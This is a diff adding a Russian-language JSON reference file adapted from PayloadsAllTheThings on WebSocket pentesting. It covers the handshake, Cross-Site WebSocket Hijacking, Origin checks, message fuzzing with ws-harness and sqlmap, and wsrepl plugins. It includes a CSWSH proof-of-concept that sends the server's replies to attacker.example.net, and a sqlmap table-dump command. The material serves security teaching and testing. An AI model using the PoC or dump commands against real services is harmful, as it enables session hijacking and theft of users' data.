@@ -1,0 +1,194 @@
+{
+  "category": "Web Sockets",
+  "source": "PayloadsAllTheThings/Web Sockets/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое WebSocket и где искать баги",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "WebSocket — полнодуплексный канал поверх одного долгоживущего TCP-соединения: real-time двусторонний обмен между браузером и сервером.\n\nТипичные применения: чаты, онлайн-игры, push-уведомления, биржевые/торговые платформы — везде, где нужны частые низколатентные обновления.\n\nЧто проверять при пентесте:\n• защищён ли handshake CSRF-токеном/nonce → если нет, возможен CSWSH (см. ниже).\n• проверяет ли сервер заголовок Origin при апгрейде.\n• санитизируются ли данные из WS-сообщений (XSS при выводе, SQLi при попадании в запрос).\n• можно ли подменять/реплеить сообщения и манипулировать самим handshake."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "WebSocket-протокол — handshake (Upgrade)",
+      "language": "text",
+      "tags": ["methodology", "protocol", "handshake"],
+      "body": "WebSocket стартует как обычный HTTP/1.1-запрос, а затем апгрейдит соединение до WebSocket-протокола.\n\nКлиент шлёт специальный HTTP-запрос с заголовками, указывающими на желание переключить протокол; сервер отвечает 101 Switching Protocols. Если сервер принял запрос, дальше идёт двусторонний обмен фреймами по RFC 6455."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Запрос клиента — Upgrade на WebSocket",
+      "language": "http",
+      "tags": ["protocol", "handshake", "request"],
+      "body": "GET /chat HTTP/1.1\nHost: example.com:80\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13"
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Ответ сервера — 101 Switching Protocols",
+      "language": "http",
+      "tags": ["protocol", "handshake", "response"],
+      "body": "HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo="
+    },
+    {
+      "subcategory": "Методология",
+      "title": "SocketIO",
+      "language": "text",
+      "tags": ["methodology", "socketio"],
+      "body": "Socket.IO — JavaScript-библиотека (клиент и сервер), дающая более высокоуровневую абстракцию над WebSocket. Цель — упростить и сделать надёжнее real-time-обмен в разных браузерах и окружениях.\n\nНа практике поверх Socket.IO встречается своя CSWSH-специфика (см. референс «Cross Site WebSocket Hijacking with socketio»)."
+    },
+    {
+      "subcategory": "CSWSH",
+      "title": "Cross-Site WebSocket Hijacking — суть",
+      "language": "text",
+      "tags": ["cswsh", "hijacking", "csrf"],
+      "body": "Если handshake WebSocket не защищён CSRF-токеном или nonce, атакующий может использовать аутентифицированный WebSocket жертвы со своего подконтрольного сайта — потому что cookies браузер подставляет автоматически. Эта атака называется Cross-Site WebSocket Hijacking (CSWSH).\n\nПо сути это CSRF на этапе апгрейда: единственная защита, на которую полагается сервер (cookie-сессия), под контролем атакующего, а Origin не проверяется. В результате со страницы атакующего открывается соединение от имени жертвы, и ответы сервера эксфильтруются наружу."
+    },
+    {
+      "subcategory": "CSWSH",
+      "title": "PoC — эксфильтрация данных из WebSocket на сервер атакующего",
+      "language": "html",
+      "tags": ["cswsh", "poc", "exfiltration"],
+      "body": "<script>\n  ws = new WebSocket('wss://vulnerable.example.com/messages');\n  ws.onopen = function start(event) {\n    ws.send(\"HELLO\");\n  }\n  ws.onmessage = function handleReply(event) {\n    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});\n  }\n  ws.send(\"Some text sent to the server\");\n</script>"
+    },
+    {
+      "subcategory": "CSWSH",
+      "title": "Подгонка PoC под Sec-WebSocket-Protocol",
+      "language": "text",
+      "tags": ["cswsh", "poc", "tip"],
+      "body": "Код PoC нужно подогнать под конкретную ситуацию. Например, если приложение использует заголовок Sec-WebSocket-Protocol в handshake-запросе — добавь это значение вторым параметром в вызов new WebSocket(...), чтобы заголовок проставился:\n\nnew WebSocket('wss://vulnerable.example.com/messages', 'значение-протокола')"
+    },
+    {
+      "subcategory": "Отсутствие проверки Origin",
+      "title": "Почему CSWSH вообще работает — Origin не проверяется",
+      "language": "text",
+      "tags": ["cswsh", "origin", "methodology"],
+      "body": "Корень CSWSH — сервер при апгрейде не валидирует заголовок Origin и доверяет одной лишь cookie-сессии.\n\nКак проверить:\n• перехвати handshake-запрос (Burp) и подмени заголовок Origin на чужой домен — если сервер всё равно отвечает 101 Switching Protocols и соединение работает, проверки Origin нет.\n• если при этом для аутентификации используется только cookie и в handshake нет уникального непредсказуемого токена — уязвимость подтверждена.\n\nЗащита со стороны сервера: проверять Origin по allow-list и/или требовать CSRF-токен/nonce в handshake."
+    },
+    {
+      "subcategory": "Манипуляция сообщениями",
+      "title": "Манипуляция WebSocket-сообщениями и handshake",
+      "language": "text",
+      "tags": ["methodology", "manipulation", "injection"],
+      "body": "После установки соединения данные ходят сообщениями (фреймами). Если приложение доверяет содержимому сообщений, через них проходят классические инъекции:\n• подменяй/реплей сообщений в Burp (вкладка WebSockets) или через wsrepl.\n• в тело сообщения вставляй полезную нагрузку: XSS (если сервер потом отрисует значение в DOM другому пользователю), SQLi/NoSQLi/командную инъекцию (если значение попадает в запрос/команду на бэке).\n• отдельно атакуй сам handshake: подмена заголовков (Origin, Sec-WebSocket-Protocol, кастомные auth-заголовки), значения cookie/токенов в Upgrade-запросе.\n\nИдея проста: WebSocket — это просто ещё один канал ввода, относись к каждому полю сообщения как к недоверенному."
+    },
+    {
+      "subcategory": "Манипуляция сообщениями",
+      "title": "ws-harness — фаззинг WS-сообщений обычными тулзами",
+      "language": "text",
+      "tags": ["manipulation", "ws-harness", "fuzzing"],
+      "body": "ws-harness поднимает локальный HTTP-сервер-прокси перед WebSocket-эндпоинтом и на лету подставляет ввод в шаблон сообщения. Это позволяет натравить на WebSocket традиционные инструменты (sqlmap, Burp Intruder и т.п.).\n\nЗапусти ws-harness, слушающий WebSocket, и укажи файл-шаблон сообщения, которое будет отправляться на эндпоинт. В шаблоне ключевое слово [FUZZ] помечает место инъекции — туда подставляется значение из параметра ?fuzz= входящего HTTP-запроса."
+    },
+    {
+      "subcategory": "Манипуляция сообщениями",
+      "title": "ws-harness — запуск (прокси перед WebSocket)",
+      "language": "text",
+      "tags": ["ws-harness", "tools", "command"],
+      "body": "python ws-harness.py -u \"ws://dvws.local:8080/authenticate-user\" -m ./message.txt"
+    },
+    {
+      "subcategory": "Манипуляция сообщениями",
+      "title": "ws-harness — шаблон сообщения с [FUZZ]",
+      "language": "text",
+      "tags": ["ws-harness", "fuzzing", "template"],
+      "body": "{\n    \"auth_user\":\"dGVzda==\",\n    \"auth_pass\":\"[FUZZ]\"\n}"
+    },
+    {
+      "subcategory": "Манипуляция сообщениями",
+      "title": "ws-harness + sqlmap — SQLi через WebSocket",
+      "language": "text",
+      "tags": ["ws-harness", "sqlmap", "sqli"],
+      "body": "sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump"
+    },
+    {
+      "subcategory": "Манипуляция сообщениями",
+      "title": "ws-harness.py — исходник",
+      "language": "python",
+      "tags": ["ws-harness", "tools", "source"],
+      "body": "#!/usr/bin/python\nfrom __future__ import print_function\nimport socket,ssl\nfrom BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer\nfrom websocket import create_connection, WebSocket\nfrom urlparse import parse_qs\nimport argparse\nimport os\n\nLOOP_BACK_PORT_NUMBER = 8000\n\ndef FuzzWebSocket(fuzz_value):\n    print(fuzz_value)\n    ws.send(ws_message.replace(\"[FUZZ]\", str(fuzz_value[0])))\n    result =  ws.recv()\n    return result\n\ndef LoadMessage(file):\n    file_contents = \"\"\n    try:\n        if os.path.isfile(file):\n            f = open(file,'r')\n            file_contents = f.read()\n            f.close()\n    except:\n        print(\"Error reading file: %s\" % file)\n        exit()\n    return file_contents\n\nclass myWebServer(BaseHTTPRequestHandler):\n    \n    #Handler for the GET requests\n    def do_GET(self):\n        qs = parse_qs(self.path[2:])\n        fuzz_value = qs['fuzz']\n        result = FuzzWebSocket(fuzz_value)\n        self.send_response(200)\n        self.send_header('Content-type','text/html')\n        self.end_headers()\n        self.wfile.write(result)\n        return\n\nparser = argparse.ArgumentParser(description='Web Socket Harness: Use traditional tools to assess web sockets')\nparser.add_argument('-u','--url', help='The remote WebSocket URL to target.',required=True)\nparser.add_argument('-m','--message', help='A file that contains the WebSocket message template to send. Please place [FUZZ] where injection is desired.',required=True)\nargs = parser.parse_args()\n\nws_message = LoadMessage(args.message)\n\nws = create_connection(args.url,sslopt={\"cert_reqs\": ssl.CERT_NONE},header={},http_proxy_host=\"\", http_proxy_port=8080)\n\ntry:\n    #Create a web server and define the handler to manage the\n    #incoming request\n    server = HTTPServer(('', LOOP_BACK_PORT_NUMBER), myWebServer)\n    print('Started httpserver on port ' , LOOP_BACK_PORT_NUMBER)\n    \n    #Wait forever for incoming http requests\n    server.serve_forever()\n\nexcept KeyboardInterrupt:\n    print('^C received, shutting down the web server')\n    server.socket.close()\n    ws.close()"
+    },
+    {
+      "subcategory": "Манипуляция сообщениями",
+      "title": "Схема: SQLMap → ws-harness → целевой WebSocket",
+      "language": "image",
+      "tags": ["ws-harness", "sqlmap", "diagram"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/web-sockets/WebsocketHarness.jpg",
+        "caption": "Поток данных: SQLMap шлёт HTTP GET-запрос в Loopback Web Server (ws-harness), тот пересылает его как WebSocket Request на целевой эндпоинт; WebSocket Response возвращается обратно и отдаётся SQLMap как HTTP GET Response. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Манипуляция сообщениями",
+      "title": "ws-harness — старт локального сервера",
+      "language": "image",
+      "tags": ["ws-harness", "screenshot"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/web-sockets/websocket-harness-start.png",
+        "caption": "Запуск python ws-harness.py -u \"ws://dvws.local:8080/authenticate-user\" -m ./message.txt — поднялся httpserver на порту 8000. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Манипуляция сообщениями",
+      "title": "sqlmap определяет инъекцию через ws-harness",
+      "language": "image",
+      "tags": ["sqlmap", "sqli", "screenshot"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/web-sockets/sqlmap.png",
+        "caption": "sqlmap против http://127.0.0.1:8000/?fuzz=test с --tamper=base64encode: эвристика показывает, что параметр fuzz может быть инъектируемым (возможная СУБД MySQL) и уязвим к XSS. Так классические тулзы работают по WebSocket через ws-harness. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Тулзы",
+      "title": "Инструменты для пентеста WebSocket",
+      "language": "table",
+      "tags": ["tools", "wsrepl", "ws-harness"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Инструмент", "Назначение"],
+          "rows": [
+            ["doyensec/wsrepl", "WebSocket REPL для пентестеров (интерактивный + автоматизация плагинами)"],
+            ["mfowl/ws-harness.py", "Прокси-харнесс: натравить обычные тулзы (sqlmap, Intruder) на WebSocket через [FUZZ]"],
+            ["PortSwigger/websocket-turbo-intruder", "Фаззинг WebSocket кастомным Python-кодом"],
+            ["snyk/socketsleuth", "Burp-расширение с доп. функциями для пентеста WebSocket-приложений"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Тулзы",
+      "title": "wsrepl — назначение и установка",
+      "language": "text",
+      "tags": ["wsrepl", "tools", "repl"],
+      "body": "wsrepl (Doyensec) упрощает аудит приложений на WebSocket: интерактивный REPL, удобный и легко автоматизируемый. Построен на Python TUI-фреймворке Textual и совместим с аргументами curl — легко перейти от Upgrade-запроса в Burp к wsrepl. Даёт полную прозрачность WebSocket-опкодов по RFC 6455 и авто-переподключение при обрывах.\n\nУстановка и запуск:\npip install wsrepl\nwsrepl -u URL -P auth_plugin.py"
+    },
+    {
+      "subcategory": "Тулзы",
+      "title": "wsrepl — плагин (хуки жизненного цикла)",
+      "language": "python",
+      "tags": ["wsrepl", "plugin", "automation"],
+      "body": "from wsrepl import Plugin\nfrom wsrepl.WSMessage import WSMessage\n\nimport json\nimport requests\n\nclass Demo(Plugin):\n    def init(self):\n        token = requests.get(\"https://example.com/uuid\").json()[\"uuid\"]\n        self.messages = [\n            json.dumps({\n                \"auth\": \"session\",\n                \"sessionId\": token\n            })\n        ]\n\n    async def on_message_sent(self, message: WSMessage) -> None:\n        original = message.msg\n        message.msg = json.dumps({\n            \"type\": \"message\",\n            \"data\": {\n                \"text\": original\n            }\n        })\n        message.short = original\n        message.long = message.msg\n\n    async def on_message_received(self, message: WSMessage) -> None:\n        original = message.msg\n        try:\n            message.short = json.loads(original)[\"data\"][\"text\"]\n        except:\n            message.short = \"Error: could not parse message\"\n\n        message.long = original"
+    },
+    {
+      "subcategory": "Тулзы",
+      "title": "wsrepl — про плагины",
+      "language": "text",
+      "tags": ["wsrepl", "plugin", "tip"],
+      "body": "Чтобы перейти к автоматизации WebSocket, достаточно написать Python-плагин. Система плагинов гибкая: можно определять хуки, выполняемые на разных стадиях жизненного цикла WebSocket (init, on_message_sent, on_message_received, ...)."
+    },
+    {
+      "subcategory": "Лабы",
+      "title": "Практика — лабы по WebSocket",
+      "language": "text",
+      "tags": ["labs", "practice"],
+      "body": "• PortSwigger — Manipulating WebSocket messages to exploit vulnerabilities\n• PortSwigger — Cross-site WebSocket hijacking\n• PortSwigger — Manipulating the WebSocket handshake to exploit vulnerabilities\n• Root Me — Web Socket - 0 protection"
+    }
+  ]
+}
